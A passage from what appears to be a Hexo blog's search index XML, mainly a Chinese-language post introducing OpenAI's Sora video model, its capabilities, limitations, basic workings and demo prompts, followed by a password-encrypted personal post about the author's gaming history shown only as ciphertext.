          <category> 经验记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cloudflare </tag>
            
            <tag> AI </tag>
            
            <tag> Vercel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OpenAI Sora 介绍及原理</title>
      <link href="/posts/3791443755/"/>
      <url>/posts/3791443755/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>最近浏览 AI 相关技术时看到一消息，2 月 16 日 OpenAI 官方称其发布文生视频大模型 Sora：</p><blockquote><p>Sora can create videos of up to 60 seconds featuring highly detailedscenes,complex camera motion,and multiple characters with vibrantemotions.</p></blockquote><p>“60 秒”、“文生视频”。别人还在研究连贯性，它已经达到很高的水平。</p><p>看到这个消息时已经过去五日，但搜索“AI”已经有好几篇介绍和分析的文章出现了。</p><h2 id="Sora-是什么">Sora 是什么</h2><p>目前 OpenAI 尚未开放 Sora 灰度测试，但从目前放出的演示来看，它已经令人惊叹。Sam Altman 在 X 平台疯狂安利，根据用户提供的语句生成视频并回复。</p><p>根据 OpenAI 官网 <a href="https://openai.com/sora" rel="external nofollow noreferrer">https://openai.com/sora</a> 的介绍，可得知目前 Sora 有以下功能：</p><ul><li>可以从文本指令中创建逼真和富有想象力的场景；</li><li>可以生成长达一分钟的视频；</li><li>能够生成具有多个角色、特定类型的运动以及主题和背景的准确细节的复杂场景；</li><li>可以在单个生成的视频中创建多个镜头，以准确保留角色和视觉风格</li></ul><p>其不足之处在于：</p><ul><li>它可能难以准确模拟复杂场景的物理特性，并且可能无法理解因果关系的具体实例。例如，一个人可能会咬一口饼干，但之后，饼干可能没有咬痕</li><li>可能混淆提示的空间细节，例如左右混淆，并且可能难以精确描述随时间推移发生的事件，例如遵循特定的相机轨迹。</li></ul><h2 id="Sora-的原理">Sora 的原理</h2><p><a href="https://anyubenyu.com/sora-technical-report-mindmap/" rel="external nofollow noreferrer">https://anyubenyu.com/sora-technical-report-mindmap/</a></p><p>Brett Goldstein 在 X 上表示，Sora 的工作流程是让模型从噪点开始扩散，逐渐精细化到所需的视频，之后使用 Diffusion Transformer 架构处理连续的视频帧，确保视频中的动作流畅自然。它是依赖于所谓的“补丁”，将文本转化为事件和时间的快照。</p><p>Sora 先将可视化数据转换为补丁，之后通过视频压缩网络进行训练并生成视频；将图像视为单帧视频，通过对视频提取一系列时空补丁，使其能够对可变分辨率、持续时间和纵横比的视频和图像进行训练。Sora 通过 Transformer 架构、扩散模型、缩放转换器、字幕器模型、模拟数字世界等技术，最终生成一个完整的视频。</p><p>思维导图详见 <a href="https://anyubenyu.com/sora-technical-report-mindmap/" rel="external nofollow noreferrer">https://anyubenyu.com/sora-technical-report-mindmap/</a></p><h2 id="官方演示（部分）">官方演示（部分）</h2><p>此处仅展示部分比较经典的画面，使用压缩后的截图，原视频可见官网。</p><blockquote><p>Prompt: A stylish woman walks down a Tokyo street filled with warm glowing neon and animated city signage. She wears a black leather jacket, a long red dress, and black boots, and carries a black purse. She wears sunglasses and red lipstick. She walks confidently and casually. The street is damp and reflective, creating a mirror effect of the colorful lights. Many pedestrians walk about.</p></blockquote><p>一位时尚的女人走在东京的街道上，街道上到处都是温暖的发光霓虹灯和动画城市标志。她身穿黑色皮夹克，红色长裙，黑色靴子，背着一个黑色钱包。她戴着墨镜，涂着红色口红。她走得自信而随意。街道潮湿而反光，营造出五颜六色的灯光的镜面效果。许多行人四处走动。</p><p><img src="https://s2.loli.net/2024/02/21/S8DXm6ikOv51zqN.png" alt=""></p><blockquote><p>Prompt: Drone view of waves crashing against the rugged cliffs along Big Sur’s garay point beach. The crashing blue waters create white-tipped waves, while the golden light of the setting sun illuminates the rocky shore. A small island with a lighthouse sits in the distance, and green shrubbery covers the cliff’s edge. The steep drop from the road down to the beach is a dramatic feat, with the cliff’s edges jutting out over the sea. This is a view that captures the raw beauty of the coast and the rugged landscape of the Pacific Coast Highway.</p></blockquote><p>海浪拍打大苏尔加雷角海滩崎岖悬崖的无人机视图。汹涌澎湃的蓝色海水掀起白色的波浪，而夕阳的金色光芒照亮了岩石海岸。远处有一个带灯塔的小岛，绿色的灌木丛覆盖着悬崖的边缘。从公路到海滩的陡峭落差是一项戏剧性的壮举，悬崖的边缘突出在海面上。这张照片捕捉到了海岸的原始美景和太平洋海岸公路崎岖的景观。</p><p><img src="https://s2.loli.net/2024/02/21/iZD1f8ry94saebM.png" alt=""></p><blockquote><p>Prompt: A gorgeously rendered papercraft world of a coral reef, rife with colorful fish and sea creatures…</p></blockquote><p>一个华丽的珊瑚礁纸工艺品世界，到处都是五颜六色的鱼和海洋生物……</p><p><img src="https://s2.loli.net/2024/02/21/AU46Q2ankzITLdr.png" alt=""></p><blockquote><p>The camera follows behind a white vintage SUV with a black roof rack as it speeds up a steep dirt road surrounded by pine trees on a steep mountain slope, dust kicks up from it’s tires, the sunlight shines on the SUV as it speeds along the dirt road, casting a warm glow over the scene. The dirt road curves gently into the distance, with no other cars or vehicles in sight. The trees on either side of the road are redwoods, with patches of greenery scattered throughout. The car is seen from the rear following the curve with ease, making it seem as if it is on a rugged drive through the rugged terrain. The dirt road itself is surrounded by steep hills and mountains, with a clear blue sky above with wispy clouds.</p></blockquote><p>镜头跟随一辆带有黑色车顶行李架的白色老式 SUV 后面，它在陡峭的山坡上加速行驶在一条被松树环绕的陡峭土路上，轮胎上扬起灰尘，阳光照在 SUV 上，因为它沿着土路飞驰，为场景投下温暖的光芒。土路缓缓蜿蜒向远处，看不到其他汽车或车辆。道路两旁的树木都是红杉，到处都是绿色植物。从后方可以看到这辆车可以轻松地沿着弯道行驶，看起来好像是在崎岖的地形上崎岖不平地行驶。土路本身被陡峭的丘陵和山脉所环绕，上面是湛蓝的天空和轻薄的云彩。</p><p><img src="https://s2.loli.net/2024/02/21/U1VKAuxtPYnBEdg.png" alt=""></p><blockquote><p>Prompt: Tour of an art gallery with many beautiful works of art in different styles.</p></blockquote><p>参观艺术画廊，欣赏许多不同风格的精美艺术作品。</p><p><img src="https://s2.loli.net/2024/02/21/xWX1r9ylotHf687.png" alt=""></p><blockquote><p>Prompt: Beautiful, snowy Tokyo city is bustling. The camera moves through the bustling city street, following several people enjoying the beautiful snowy weather and shopping at nearby stalls. Gorgeous sakura petals are flying through the wind along with snowflakes.</p></blockquote><p>美丽、白雪皑皑的东京市熙熙攘攘。镜头穿过熙熙攘攘的城市街道，跟随几个人享受美丽的雪天，并在附近的摊位购物。绚丽的樱花花瓣与雪花一起在风中飘扬。</p><p><img src="https://s2.loli.net/2024/02/21/CeSBf1rIaOL5REx.png" alt=""></p><h2 id="参考">参考</h2><blockquote><p><a href="https://openai.com/sora" rel="external nofollow noreferrer">https://openai.com/sora</a><br><a href="https://www.zhihu.com/question/644478200" rel="external nofollow noreferrer">https://www.zhihu.com/question/644478200</a><br><a href="https://juejin.cn/post/7336756519240908800" rel="external nofollow noreferrer">https://juejin.cn/post/7336756519240908800</a><br><a href="https://openai.com/research/video-generation-models-as-world-simulators" rel="external nofollow noreferrer">https://openai.com/research/video-generation-models-as-world-simulators</a><br><a href="https://chatgpt-zhinan.online/sora-technical-report-mindmap/" rel="external nofollow noreferrer">https://chatgpt-zhinan.online/sora-technical-report-mindmap/</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 信息技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AI </tag>
            
            <tag> Sora </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>霜序拾桃叶-关于我的游戏历程</title>
      <link href="/posts/4238296291/"/>
      <url>/posts/4238296291/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，这个密码看着不太对，请再试试。" data-whm="抱歉，这个文章不能被校验，不过您还是能看看解密后的内容。">  <script id="hbeData" type="hbeData" data-hmacdigest="c4f94d45f902c3b2c9869929a92a9df0386653c95546ce13c9e509db64ee8ec4">3c4eb1d13bbfc472d2158149c25b9b2127cbac205926b7ffd0243688e0d4a6c8756ff64a09735193102f2e03e5f27b6e45bf2d808656fb04731cf9f4a6510f6c10aad312322c6a3707ca6998fb2fd512a62e448e043caa2c6ff58cf693a5281b70f63dab5079e563e4c9ab76266cf5fee16f9a62fef884f1233730abb6044ab0eed0b52ecde6906856643c889b186e87e1270f6612a8b41a605ab8311e09903e30241fe3f68239adeed64bc9218879c179851ca14c3b4ba22948d9476fe6754cac0b001dbb3087e0b16d97864d23a3c02377c4cc2060ebc00c7c830da87866c9c6230c2d4c2ef4d08a5840ee871381a36543f0d8119410eca65987f0cf4148e2e95734c91881fe29506408d9841040416d4b6f60155832fb2166e3f7d1556994c6dac0ababc11ac1429a952c76629e660f543e262b3afc1f781c9b66831b4c6083b593ee39d30d84385c0f936046858f4062c71a6c8c843c6ad09336272e4644ef5c1f4fa6aba55a03fd21f6c6cdca1c583bfb698aa5934f215e3a85daa52eccbb8acd826496b67177679c004c5ebcb3e51d6973f03692650c56ee44b67f5cdd1f56cecd742c4813d14e848b51f11a4a0c01c845fd00db6e9cf229e649b660b80305f45d35f63d034a5072edefe980b4dcb2e942cf36c68044ee7b5772df365ed48464b48b1614d261b8267a6d2005993600857bf73205d5f3dc2b58d53115e55c560e6b3fdf89a0c3c54afb9591eae434018f25c026b24e2a3b9ceff5ed25d39ddab45e3fc907f4ec7ce10f5e14817432d52f5af86d997e1b8fe13551533eac183670465fae307743073505adb035db5e9794763a9074062743e9b6708d765210acad0b39315818a813c2fa61f655e388c13200de537fac092fd9ed34d6929bb3d1dbcbe9fb7dea58bd06727fb47f9cd31b9a63ae9917a30d7885e21734c0d77f5fb08b8493ec11c273d287f83c26fb7078d0d1dd833917e852607b9cc0c4eec456f3db85d0272b563a6c2f92e30f92246f14449f4171f5f7d72617220d026490049c6c4069483821b73ade1150e25575a6605de9141999c425d9ad4243a1593a16539849633696b5386bea97d91ff9f0249e2af9c7449a67e0cd547267a5d7e2f7081c15820d800fafaf4529a7ef14140844746661b09288fc6af522d7b3c13d9891fd47c7e9dfdea114e058931a38bd1bf33ce82b7295706c1b32f2fb47e449bebae0c9c3bf5273df4f96098f91a53eea3937c1b160957704aea8c91f48531d2fb7e832ebfb6d2bacd06b67048edde120f28e440e5d6556e30782fbf7a09fe3735bbddb65470197cb46135555975e580ffd7bdf212e4bcddfb10584bfce78cc98e1d73e8334274b7611533fa418579ea4334e192203f9f5e4221b9176d0561d9efb640a1982df495f72f33dc1f6373c4b5d196b17ded27ff415737ecf48480480b434dd12d8f79055a259228080b8ce9b17a516eefb4fe8c0a72beac42580ca3e3077f8a930f8ab525698966f25d646a72061cb409850889788c01cde832b49bb56be6ae96a658dee3b6eefcadc5b87ddec8d1e4d52f73ca2589545bb586c66e0edaa879dae62cd26256525333d88dd73fda1a1f5c6750cb1015f6cdf36ffbd32b19e564ded125f1e16348849a65cbc62c7374d2ca3fae4fb973c992abe3e951efdbf710367638bbe7a2bec88334c280f6e2b6e3abbd140b15a9de6e0517ddc83c797dc9e64b2169cf8bc53da1b5b3280882bc7a1a26873a602f143f3ef2b5ef719d0b9aacbe9ea1683c89e469edf1289439a28813d5aa0919f85e60915bdf1fbe6b18365ad8ad7cebf5d095de6c19aa82ef96ed9ff3c2caab98549e1e4357c80205ac20fc56bb8d0dcfd4b6a6e57fa2869c0644a467a69b6fabe8563a21dbd5f5a5074c557b4f99864ed0fea947f0b74b8d6d62aed035afe8e414405e3e9eedac4ac97bc9991194dd69f5dd1fa1862e03bf1964298a8c4079496785315a58cda033e6eefb05950b3d06e84ede4570cf426bd44b6fc415e49ab0cbc61e67dfc0d85e49c5f98a0926e1af6353b91653c7b1b474f7eb55fc4023a90f85833b45d6b009e19feea3e0a24618c15314f34ae9d1b5a0f0f7c44f588bc944a594a0e8c00a6e3037568b6c0372171ab65be7031fff6d8d3fab4a0844a6969e76ba0eda3a7280e0f520e846589b983e6082fd92473fb5f3c5582d8dd1c4ffe89377960d367133ff57e382932a921621e41b58396a51a4af7afc9de05a9a6ff9aa38831e65835ba1d2ec949d8ad30f923230781140a6dc92a3ffbb2cb55d51bb21a4849a311040b2e8c490069676fda276a7174dd7ba56597497eb45d9e505935feeb2435316134407012773add977e34ea9b87fec784f145c2f515e857f71ce54fb20916128a80fd38f04c80f37b76bad412789c6da0f3428f240cc98dd40c92479d2243b057280a226de1a325e145f31f21b0585576b4139fc348c8698be1e3f8cf1df45ba9a6306eef2ee28a8c3e43eebe70f7244e81cac32576708001a5471710d8ba5ca48c083dc21d55a27769b9a4194ccc5cfd25418e0e6f71eb74d4951c0f93454d57e32c9c0cf335f0fc7099fc6b4c380379a3109727ea42ff5f531fb8b508fdd65ede9974065815a358bd5bd5157d60c70277a7a6b3e555ac57427c90e45ff4d4a1dfd9d8f37ea27e2364a831312f1bef24f983ed323b9ec1ac9d290d566674160794eabf3bc4e5483d1c0de69e25c38fb447c18d0f82b3461d6e6d631f7f8245db94021e32c1590b6be77d64ad97d9d002e5a7d04b4500ac15bebe8d84b4a86e4293bf33954d04ed488df94c072a0d4af10a3b8b87ddff3e1374a74f1705dc65961601176ff950233b6c14b4577d8bc3648b13c83fd277d0e7186c78e6683e4136477dcee041abe0c6ad13f813ea79474a44966b9eceb715f3631cb3743bcc7051ffc3a0a7c2c18631ca7fee4fd3c100234bfd2ccd7bc785ebd90efe80b14294e5220da34be14f3d76bcbb6489bab1437e5753ac17b4937d8fc5fbdbc4880e7c96b9c18a1149f9b7f10c824e3776a75efcfb8825522355ca0f570d175a9237cbb3496f0e3e1eb615d69670ad4e99ccca108670cb4e0fa647973d03cc6ddc386d7114b071d074611f305baf923ccdedb920e222b8c633d7ad8835f8ba9970d056159ec65e5e1fe3d659e20eb12ff44d671dc97a8d29e8c319f4a4150538684b332c07e450d63cb5e5e350c4d6c65e2d884339ec7b62b8050c07fab1fd66ae3fb56077d8ec2136278490a26240ea42ec8471a78a8d56e4ab139039e0df91d0f082051c30b2f6ac21f50797461685a86b1764693a43f091eca749456db82f03dca56566cd3d824ba698a84b375b7003d5b8da512c7c1288265f7d42c963f18cc86316d49646b9ba0c418eecbb6faa1562204715892f2c914809d8f02e0de14b23b8a9964753487e7ddb290cd36c308385e6f6fc7bf055ab8f26c23556ca2fb4bb7fd2e70cb463a346fce7e67cc8e2991a4c01fdc78b444ec071df4bb8b77b40e4daca29b3373216244a296e28a136e26b78bd1c2a9e029edd0843861c3af25468c790749f7ff45ba8f3e98fabec2af634a6e08b37bb6a107678c776a55909f42d4a34bc10c105a673b581c72976eae7ac3696ab805927ab074b9995914dfeb6de458dd3cb6b04017456ca7d7a7d1d4108e67a04a6e100ce81bc7cc35ccfaf9fcde422a4be3de1115b2ea24656dc81d0eb0fa6f020a495eec69644856f37bdc8eafdad41f927e026ac18ef8e4819bc24c9084b55e40cae2e3e53f328eab5308a6d26bb95f29d142a4c31e1f9d1b272146a287b603c59865ca848a17222ee45e9ff5ee714f4150122142b7646d5cebe973f72d2accac48145f679ed66b7c605e56ef9a62cb0bbbc8650038c338fe2fe9d4f51f28442277545b8f807ccd602347187e4d6e296f82cf3680b4f2e527d9a82192adb63939b1393a7d775d71eed6ff8251388bef4cda38bb07f498de3dfc56b5ee825eae5f062b2f413a1173b7c8b82d1cb4b115320f52cdc786fcabdc428c3d8bafdc176acde48e4bea535fd721a15ead3b4ac832b8507fd76c456e1243cf947f2de702a887107748ee7b32a47260825c3703d33c5f63c1f426a1f10ddcfffb06c8c3450356857c1cdcd7a78be9bea09212a2c3440775ce462ae745a3edbbdbfcddcb29d9cf8af21d28e16a420e7ae593387af91b2bdc332e4f96ba0342890411a8eadfc8611b0a5da76defad7d53d390c42ee20040304e29b9c7191a850688c3d1b7c6ad3f8de1d146c8de27361254710d9c886ef56c8122277cd27edbec8d1d09c31c804148f75d2d8c6dad4ca04e0534dffb5dd794bae971899de5667ffd71c9c5cf25b9ea896955921cc07f177368d799b8aa451fa9312b6a5411de9164f98d0b08f560fd5b29a1f654c7ce62a7c23f91aab1232a2579297fe2fa6375f3965431c12030bd7bda26962d5b2fc73783bf06f94fa99591ae3e89fb03f273b2df87c3717fb1d43a2161efbd6841cb3773a6a2ec01977d41f019910f4edb276db266b38a9975d1eb79d0664908a8a44fa56e5f0950238b88e2e5fce39eaeaff05f8b5ab8bf91dfe482cd91b6e177dc1206ad9485459d2d020ca7669eca93e2830f9f474057281d429dbc88677a92a2606fdbf47045416aaaf9c7bf7b8e5232c5bbe06c0a0d0c691523a621a6c76cf4682082abbc333d564b222ab46d9474e93b5eae305e627f3204fc1279282e07d70f72b5b9cb2e66242b9066a786655c21a4a0e1546977976a4d6ca6aa4229a7068edba3b9d5eeee89cce3f17448794ad68fb5ab7648d408594b18e9dae4ea89a106530cd50b69be26eb6cfb7258c29b966cc99c0eb5a23e1927c85cf94cfed73dc2066172adbbe386afb2819b7160c9de3cc10c61024580c5ff5903604610657da1d746b693b43775003445b5ce050c2713414a84f68e7eace129d5727482e80b32c4cbca3b5a514fcf928a60083ff6c49574bcc4bc087dbf0514b39d2cbc14429c6c263d0dadb97fc4e7c987718eb125e4d8ef9c9e33351c8c3d691b6af9d74905ced58e05a6e5b16770725379bfa3082b248506f45651d68f1c5f039f1fa4d1fde0c719d93faf14c3aa70204b1b106222a3820cbbebcc287833cc31cd485f740577203fc55028f430828c32d3f66733bd0eaf8045526a423f5d94a6dc8a65d89291264bb01be1a82b00c798b3fff84632482636bfe9b2b06b188136e7761e597b3add02a0aa53af91e81cb1be1e57ce8e6f187fca0e8346692a25d06c0441b056d0fec15f42434f5ab91cc7fee5caaaf56c82167c7d1369f1d1e429d689f487a1c6c8c2ed51b35dd7bff746d122a10acb3f73ce2b653755e86e8b960c0003770e823cbcbdeacaeb98c6dbdf1f3773cc9a02d03d46af5e2a412c871f1ce408e5a51514d0f55ffc71c47ea0536be74ba522944bf49f72eeb36f339860a6eba635dd7fcea2ddd6b027986f67b87f7a1889abab0d50f53e23146f3eae002a7c31954bcbeef61c9eb12de98445cde6a82dee0892d4518192904a5c1b2bfaff63ea8b704a6c00f89335e8d6f4202336e8f2fe041c3e3a6df8b194ad3bc49926da30bf59b89bb8e0886932fc977a298a38a69cadbccef4f24977d4f87ce0f546a75e14ddbfd0b683625f53777a537d46256335328605b249dc43a6eaff78bcce8a908f28ff010c2ed4a6e9947fb30a248ffa290c5b8e869c93a9a6462cdd969dfb99456d3c1f50f77e11a06aba4db0c0d5cfc724d754bd995359f191e2cf87bcc1f584a142421aaea172208a9608a40329912cc0352d2babd609a64edc2c57584373dd57e8bcc0d5e489c9ecd61e43bfbbaab0f6b447e912f38e18daa665430c5dc270c02940ec97d7cadae26372bd85d1ef5fd7bf13feb7a6bb9fd1839d9e8d1cbe87ed7f3650353d45251ee6aaeaaf0d892f71e501e3a7aa603a1f49836ca41396f0c3c3158fcb080d2b863251b06cfe0a2ff1754cb09ec74ccb5fc60269d2f972a758258655ecd97fdfbdf15fd6e7cd6e98215f03728b230fa279bcf38a21447fd7942626d4bdabf69ddd427f1f0f025d6016f532c40b3902c009f8328ffd40988b1123b0ec9993434b8232de50580e650d231ae2e089c71bfefe392a932647dcf6cefbcd068f38df7d452c0dade03d5cafb03c0f7ed0edefef5f34e3d514aa2d32a2523546d19180f15dfd33d3ddb42cc076190af12d5c25a1f3d67c6a6863d0a3e9f006c9943d1bc16333ba40b0b188719220a44fcf07a73c5c1151587457d755964ffbd0e477564511957b6b09c05fe71204eafa14a6de87660fb0f8fb3edeb52adbbeda6bbf83bd36e1b29117a107f80d77987eea6616baee39bfd56204ef4c2e040e11231f0a622821f0116cc883275f672401b2fac6cee2898c1988330aa2978706cda1e2f46560cbd4158c09c0e56f6b4bfdb6a1fc2170167d8a12b18a857b545ebd2b739ec3269a2486df22cc2829dffe7feabcaad6787bc8e61fa517c9b91f57f8c58d1103dea37ba5e4250a0c1ea764393074119dccb4f77cb362eb3e8c676ef14bbf945522b6eb3f077df21a5ed9220fd64cf70277aad0f4449f1cfa68e17beb6eac725ddcd710bdc3ed9dd07777ab87a335bda99e1f3130e30bda9f55c45157ba6389303c58a265c2c530b2eca3952e723b9eef98b4dbeedadbccd9bdbf1e3c529870dd12877778d83918619e424cd135f6a879de72057f89e0cfb8612b1f1e5951a8af81ffabab13c61679c11b2992ee5bfaa2ff35e8c924325fc7291d48c9c9865e079bfee3793016fb708b63baa15987689f4689e51183e4065711fb319775b074b6da59e7c2ae063fa2ab43712c61aae20dd7f3935484d49dcdb526086d97d3a8099670b3679d7c49249d4e55c3779924b1db3655d406fe64852b160cab63cddc9b38fa5d96a5ec54974217c69647f6457dc9b48c0708646f75d14cd09812e7d20069be69bce1e32499750fddfffa34a610b402950531770d34f5507c7a7d7898f6ae39d1bcf4266d0c586dce9f057afac86a7bb254042cad336d008aefb452927343ee3209e6ecb966fe677803969c532619df12070361a0f62e387adf4e75cb80c834097948629bf059468f97e21cd18b0ec9c21c53575cc6696fc46a98575dd7899e24778e347fc93ba6964bf32ac399eeb20699b52f430df87c6a055324245854ee8078b6764e9ee6f9dbb27d6f53e44cdea042ed6d1e6e07bfaf841cbed3a66b66fe2458d8c19f0c17ca568ffd0e0ef493113a433b56ce000934414ae4e222c1d254de1b020aade01b77a9cdce4db07528e5db2e880877174371192b570c755a7a3110bca7b4d840bf034b1f186c4feb3e870f40ecca33be8dcaeda24e2c3897ea3ee525849d4ebff8165290f32a5afcf2080e030320df60bb27ad21abbfcebc85997836b53ad17592f773441e7a62cc34f837285b8d3651f88f6ef5c5b3f27c0c713d09b6a2a075c6224d011d5c3357e7d042c0ba9fdf65ba165d5f7848438b912b9d246d3e5584e88851fb097e2f5cdaf8daf51ad97941c0a705ec16411127ecb3410e27c0246526c5f3a306bf1f39be71cf92393b6003d6cbfd87135ae57cac2ea75ff21b8ef4d251678bc27c3327b14988e89eecc2b90b28fa4f88bd5b3fac9f1f33c745cc304a3678e4c083004bbf1ea05c0f5cb552af0e3b053405b076e171b1c060e2d456cb6c738066359239930cccacaeaf4e18062eea201812a4114a0edcabb546f309e90e166f5b1b72347bee3d2c2c7a7132cf6ba5789af7be5c393e1230e4c23136b05dabdd765fb433a12e44438d82b532be2413f11f268fe923f498591a68629121056d469c82c8026ad997c61a947840034030f9898e8805bea63922faefb7413fefb177649a585f72a288dd6f3ced71e11bf6210a684621eba6942b83f0e8c59a2738ac7df2448372c63cff5385887e4b3d7749113a30fd8287fc28437be5880fad652154b95d80e0f40ff9ed682cc3d1765a705d9952e9aa78a4e95181823e54698506c6c6e5ca890ad33e3bc38c576658f1e82168c8fdb27bdcdd5ea19fbf08cd79434a4703dfc1cd6561422063efb0c92eb89445e86fc398446490c644a7b19fc11d3d3d414f85ef0b67b23c3decdc7fe85c48b9aa9b64242489ce21523009f67c131c10dcdca010d08de0767d2d9e160eb664fc80761aadfad9d226a21f901873d8d392aa5426142b95867b81a285269be675c7c8235c7bdc3de856112e45d730089b67b867c17feaea4946ab92144554207e798b4926e293f3a51186fd23a9129e03ae64f7aa8ccc615d4dfcbd07076303e3c9aeada7fa3286326cc159dc649b7a8a9c90f730aaa815ab186e0f63ada7699dc429cb391f2f4bf61d31645345fc820613034d1444a3da2888e10ffbad88b2dbfde38020487ed72bd92307fbf064926e91be24d001f0d3bab1c35bc4b1c44137104f242a78f5afcaae194a18c06d750cde4f9d365aeca9013c2a0d68d3cbcd52a1bc7827d05ca569507d3453a73cc44f3b64194013cff34fdab02e322339f921d08802eb334fdc5377a4c232f0a10d6d4a5d26e2422224bf722f414cdb7da508faaa6959484c1acdbc53de8bd27c8e44f4abf8644bb54df9511158d1ff082132a8b2e26bf563c163d217c8de58e4bfbcb426215c00954824afab9d7efe82dec93ab0242ee5c77e7827eaaed02705eb803821c662e49a5fdf5f5a78d2ced01247a505418c83e2c1f3600984220ad69eca2f0c68a0f7f9459bf6145f8bf11f74ae530fd3a8fae3dfe729ca7557e6959b80fcc229b7e59adf845994df97321f70e84a13616e725a4d3102baca5419c727e43bd42b3a341c00ee3b577b305e8c7e13f36670dee1295479d3d9eba0b9e659a6dce5e8d302cfd5dedd5a1393a1c6fd40794bb1668999349700af48db4c8930545bcaac2a334c4f775506651a5fdf1d9e78804328dc7cd51a724233fc2f4ee3fa8f3b6ce523faf1f7392684d8bbc7fc5bde6dae4f69c9bf02a3fabdd12c92d3d6eaa933db2fe23bbbbbe05d92b081267ad2ff50c4f761f9546e9cbad7c2d68975b0e502655e7bd93bbb5cd4df6357d594ad8fd7f47facd2786ff3a52b5211ff57f02555c282d95262e34afe5407f7571c5b2844d09fc689888d0b718dc5054aa07c82afc7d100c8b108eca60792804c9b4d9a8211008ae476bdaf34ac1ab338f3d4335ea416446bc2aab3779954fd8fb48767c6723d990f9675468803c251605bd6b178e6f5442c13a717f6397c4ab2c1f3545f517b83bd4a441704f53492ac3dd46be5a905b08ba50f0c4a141a183a1f15e01d067244c8a8c91e0a8d3f4c01e4964f536ba1260118ff01c79e41be9696c5b8ef08586f114dff099998ce57776b8a44ba60583fab98ff64bcac7d78c1071d9782e1e2a7ac25d4c1ff947febbbda33caaf9a8d219d8fdab3297800487bc813c2796afc00bd23ee6f792c9fd9d1e5e3ad8bb9179aa28c31e76db58ec1ad30b2c6811208e7627f7b264988dc222cb9ab167a1788f73f97838641bb40c577fc43376da5567263e53bd5043e9c3459634f65e9dcfabcb4cf8dd8cf543bdd8f5f991a60d10501b5fa044954df63bcdb0d596a43b00a906815a0684b96a4437556effcc12381e8e6efa94835fba327fc343c8b6caf6eb4a3a82b9ec76cf6a0db3eba52c37e582909b9c23b679cd79850acce391a77f014d641deba55e55d01f98b62c8d6be455ae6fc3e26ec7fb80f44d0bc63fe95502a827469769fcd34a448a3ae05149a41f99cc1aadbef6bc1565395f7d3ea12265106e859eb69ad98a195c034458de3af71865489ac0e94b76bea38e731d0b1d22e77be62616e8c5ac847b4355ca663a4256db7014cd94eea7a740c4f5452f4b7326424d447b64d864e20dd1c778a6853a3d4802f4f4cd31aa914729714a08a49ab789e85f162d44418cfd67c78128b718a287036ae14b8f5289f1512e2cf0cdcef27992519780a5496c3827b4ed810dd0ed401b4fd2aae9f786dc7e618ee6238d02f13ef2ea01ab3046ad2cc481e48249f1d9d838731527fdf0489ce5271dab5ce5c948c71214f69a84e3fed1f1f6b7a559ec2e5aaf11ccc917a384f698685b1411d36e21e3c4bce010d7f8cea003af7ce690c69176d2d7f949781cb527943c8e31d4f9ed1fabf4c9c6ed94cbda0648e51422e7a088b6d429858dfbb549fc43d8eae279f0363bc8f6a128fc1c7fd136759e2ee1c4f5c0eb2dd331b039281b68bf095c964cfd61c6a64386713ee38b818909fde4693d6077d936a6609d51564be73a7f588102d2b9959dabe37fa1d0c651c4c798deef7ce1f8cb43910b719781a5a8ba39e86e32041409a5f47929fc8eaaf2643c8978b098b23643486abf5f87bf5a4a7db19ca45962038bb6197f70ebdabff697eabfbfda83db52ef0ba6f5f2c6b3ae38c37f815806a3390903b8e2a1d0a714226dd1c4c16da44ce274e131ec98064a0bab6615577cb5c55fbae1acbab074995a729fc1dd2369d9b1fccdf53a9e69c24e0e75830f80916fa2c5f50f97ee8a2696fd434510e36c20c6c6c19ad60009db1643f884756a6f97e96e3725b8746e29015b9c7cc97157858fedc175e1fa2dfb4e02ab1459d3cb895fb805724461015510109219276669030b73419acc615f8a4e768f8ed3bba02eb119cd6d0732c433608b64b5d7e985b9989c1a8c0b7dd38899f2424eb5b94177efd211b8c631a6fcd62a5bc596fabb4a7c1c167934c90758c236c9055229b620a082277eb7fd106ccb6bd463a76bca472fa759c1297ef2b113a3f881eebbd1fe4095cee35823fc9f87f14d6057ccb3a1e6faf014dba57eb23876ed270af8b60dde0cb403e803002df4f3a5792996938591328024efa9925d971906fce3847619a62140bfb111458c1f40d91c379ab84da7a7ff618655bca3d5752da896db35cc7c9cbb7838533aa3bbe7c77cbe616cdce61870dcb487c09e3be479063d5cdd52d42fc157c79ac38e9b0d09ed504646caad55ae59e4b2e51c09198521d51b03f0332dcc2b0e40a15f0078e779f23ded50f18338eab7f54e412e926c76d26efdfb6f413b4ec77420b1ad8fdb59db9ca337d2c9b5a453bfc7e7fd9060c49447c9c109222a642a561a7c0ca0fbdc91d556974fde338abe5c37ebb847f787c4d2a384be2539d8f3fc99c37d2fbf4f735c9a1e73e9e6730f37f8ecf3eecf8693aa332c8b1d44a61765c1821f5dea3c8827e9079c8052f31ac4be3029f1a82a0c6494a52d3a10bc612200db171ba359e01451ccd68ae46c34861d14c794ac8c30ef9815d4007849017cebb714e45e1ae4032ffc4e3dd2d5e465a1ad60c1b84478fbc6ac9bbdc23301093a8a48e033b645c77591cebc284540415130ce515591626e0bd2d748aa3a26fad9971905b6d80174c042700fbcd9f8fadeaf456fd4ae173e65adbd8fa56f19eec7bf456adf6996e3b4aa3164382991383469058806d1764b8a76db6f1952e3c7654e8566e071131acc79a8739e9d07c1b5f14efb4197df11acaeb2b0f1eba09bd53de6ac6649c78971058dbfff5c87bac62528b4ba7856eb98013009675d9dd6acc8914a4a57d0b289e80423e70c05696ddc6cb8db086b5660633b8dae044d454a17e6d351b1f75400897173614f87ae644bc2eb2c36368f4be5694e3a36947bfda155695a7afb0a6ddb0f4fa541cecde7f5ae2030e15c3c881a8b52ed372b2b34b87747e38d66a45212da9b7aaa8e1c0177311ca8b8535b7c8afe67a35e6041312bc8397bb5938bbada80e4c52b893d2e90ad0d9d899d7da672b28dc15a429c5b553113de9f25028e3e2c35596db2d0d6fda176ae91ee627d41dccceb5f583796b0bf013cf5e0014ef8b6c3ea277ebe231508f9b5e873103e2cb866b5295f3fa56c43fceed3ce35a865742d8adebf6245f054f2bcfe7a99